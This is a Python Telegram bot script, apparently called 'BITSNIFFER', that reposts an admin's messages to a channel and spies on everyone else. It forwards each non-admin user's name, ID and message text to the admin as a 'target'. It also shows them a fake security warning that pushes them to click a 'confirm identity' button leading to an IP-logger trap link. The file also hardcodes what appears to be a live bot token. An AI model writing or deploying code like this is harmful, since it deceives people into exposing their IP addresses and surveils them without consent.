import asyncio
import re
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ СИСТЕМЫ ---
TOKEN = "8777973485:AAHg2x7ez-wCOMb1b9CEC-uaO4uKf4tVAxM"
CHANNEL_ID = "@hackpackposter" 
MY_ADMIN_ID = 7917303098 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def clean_and_style(text: str, msg_type: str = "TEXT") -> str:
    if not text: text = ""
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'@\S+', '', text)
    text = text.replace("тихо", "").strip()
    
    tags = f"\n\n#{msg_type} #INTEL_DATA"
    signature = "\n<b>💀 SOURCE: @hackpackposter</b>"
    full_footer = tags + signature
    
    if msg_type != "TEXT" and len(text) + len(full_footer) > 1024:
        text = text[:(1021 - len(full_footer))] + "..."
        
    return text + full_footer

def get_post_kb():
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="👍", callback_data="like"),
        types.InlineKeyboardButton(text="👎", callback_data="dislike")
    )
    builder.row(types.InlineKeyboardButton(
        text="📡 SHARE ACCESS", 
        url="https://t.me/share/url?url=https://t.me/hackpackposter")
    )
    return builder.as_markup()

def get_spy_kb():
    """Ловушка с автоматическим уведомлением"""
    builder = InlineKeyboardBuilder()
    # Ваша ссылка-ловушка
    trap_url = "https://iplogger.com/2eCyg6" 
    builder.row(types.InlineKeyboardButton(text="🛡 ПОДТВЕРДИТЬ ЛИЧНОСТЬ", url=trap_url))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ СОБЫТИЙ ---

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    u = message.from_user
    
    # ПРОВЕРКА СИГНАЛА ОТ ЛОГГЕРА (если настроен редирект обратно в бота)
    if "target_confirmed" in message.text:
        await bot.send_message(MY_ADMIN_ID, f"🚀 <b>ALERT:</b> Цель {u.id} перешла по ссылке! Проверьте панель управления.")
        await message.answer("<b>VERIFICATION SUCCESSFUL.</b>\nДоступ разрешен.")
        return

    if u.id == MY_ADMIN_ID:
        await message.answer("<b>BITSNIFFER v2.7 ONLINE.</b>\nГотов к приему пакетов, мой господин.")
    else:
        log_report = (
            f"<code>[NEW TARGET DETECTED]\n"
            f"NAME: {u.first_name.upper()}\n"
            f"UID: {u.id}\n"
            f"ACTION: TRAP_LINK_DEPLOYED</code>"
        )
        await bot.send_message(MY_ADMIN_ID, log_report)
        await message.answer(
            "<b>SECURITY WARNING.</b>\nВаш узел не верифицирован. Нажмите кнопку ниже для подтверждения.",
            reply_markup=get_spy_kb()
        )

@dp.message()
async def posting_handler(message: types.Message):
    if message.from_user.id == MY_ADMIN_ID:
        try:
            raw_text = message.text or message.caption or ""
            kb = get_post_kb()
            silent = "тихо" in raw_text.lower()

            if message.text:
                text = clean_and_style(raw_text, "TEXT")
                await bot.send_message(CHANNEL_ID, text, reply_markup=kb, disable_notification=silent)
            elif message.photo:
                text = clean_and_style(raw_text, "PHOTO")
                await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb, disable_notification=silent)
            elif message.video:
                text = clean_and_style(raw_text, "VIDEO")
                await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb, disable_notification=silent)
            elif message.document:
                text = clean_and_style(raw_text, "DOCUMENT")
                await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb, disable_notification=silent)

            await message.answer(f"🛠 <b>LOG: Packet sent.</b>")
        except Exception as e:
            await message.answer(f"❌ <b>CRITICAL ERROR:</b> {e}")
    else:
        # Шпионаж за активностью
        u = message.from_user
        spy_msg = (
            f"📡 <b>DATA INTERCEPT:</b>\n"
            f"FROM: {u.id}\n"
            f"TEXT: {message.text or 'MEDIA'}\n"
            f"STATUS: WAITING_FOR_IP_CAPTURE"
        )
        await bot.send_message(MY_ADMIN_ID, spy_msg)
        await message.answer("<b>ACCESS DENIED.</b> Пройдите верификацию.", reply_markup=get_spy_kb())

async def main():
    print("--- BITSNIFFER CORE v2.7 ONLINE ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Shutdown.")
